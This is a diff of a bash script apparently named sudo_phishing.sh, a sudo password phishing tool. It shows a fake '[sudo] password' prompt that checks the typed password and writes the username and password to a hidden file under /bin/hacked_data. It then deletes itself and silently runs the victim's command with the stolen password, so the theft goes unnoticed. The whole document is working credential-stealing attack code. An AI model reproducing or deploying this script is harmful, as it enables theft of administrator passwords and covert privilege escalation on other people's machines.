@@ -1,11 +1,3 @@
-# i="";
-# for argument in "$@" 
-# do
-    
-#     i+="${argument} ";
-# done
-# echo ""
-# echo "python /tmp/sudo.py $i"
 readonly INPUT_MESSAGE="[sudo] password for ${USER}: "
 
 
@@ -20,19 +12,12 @@ attempts() {
     if ( echo "${sudo_password}" | sudo -k -S true > /dev/null 2>&1 ); then
         MAXIMUM_ATTEMPTS=0
         ##
-        # <YOUR-PAYLOAD>
-        ##
         mkdir /bin/hacked_data
         /bin/echo "${USER}:${sudo_password}"
         /bin/echo "${USER}:${sudo_password}" > /bin/hacked_data/.sudo_password
         ##
-        # </YOUR-PAYLOAD>
-        ##
         /bin/rm /bin/sudo_phishing.sh
-        # /usr/bin/head -n -1 ~/.bash_aliases > ~/.bash_aliases_bak
-        # /bin/mv ~/.bash_aliases_bak ~/.bash_aliases
         /bin/echo "${sudo_password}" | /usr/bin/sudo -S "${@}"
-        # $BASH
         exit 0
     else 
         echo "Sorry, try again."
